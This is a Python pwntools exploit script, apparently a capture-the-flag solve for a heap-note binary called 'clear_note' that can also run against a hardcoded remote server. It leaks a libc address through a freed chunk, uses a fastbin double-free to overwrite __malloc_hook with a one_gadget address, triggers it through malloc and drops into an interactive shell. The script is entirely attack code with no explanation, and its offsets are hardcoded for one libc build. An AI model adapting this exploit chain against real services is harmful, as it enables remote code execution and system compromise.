from pwn import *
context.log_level='debug'

gadget =[0x45216,0x4526a,0xf02a4,0xf1147]
debug = 1
if debug:
	p = process('./clear_note')
	#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('39.107.67.157', 9999)

def add(info,size):
	p.sendlineafter("choice>> ",'1')
	p.sendlineafter("size: ",str(size))
	p.sendlineafter("info: ",info)

def show(idx):
	p.sendlineafter("choice>> ",'2')
	p.sendlineafter("index: ",str(idx))

def dele(idx):
	p.sendlineafter("choice>> ",'3')
	p.sendlineafter("index: ",str(idx))

add("0gur1",0x100)#0
add("0gur2",0x60)#1
dele(1)
dele(0)
show(0)


p.recvuntil("info: ")
addr = u64(p.recvline()[:-1].ljust(8,'\x00'))
log.info('addr:%#x',addr)
libc_base = addr - 3951480

malloc_hook = libc_base + 3951376
log.info('malloc_hook:%#x',malloc_hook)
#log.info('printf:%#x',libc_base+350208)

dele(1)
dele(0)


add('a'*0x100+p64(0xdeadbeef)+p64(0x71)+p64(malloc_hook-35),0x100)
dele(0)
dele(0)

#gdb.attach(p)
add("0gur2",0x60)
add('a'*19+p64(libc_base+gadget[3]),0x60)
#gdb.attach(p,'b *execve')
dele(0)#

p.sendlineafter("choice>> ",'1')
p.sendlineafter("size: ",'123')



p.interactive()
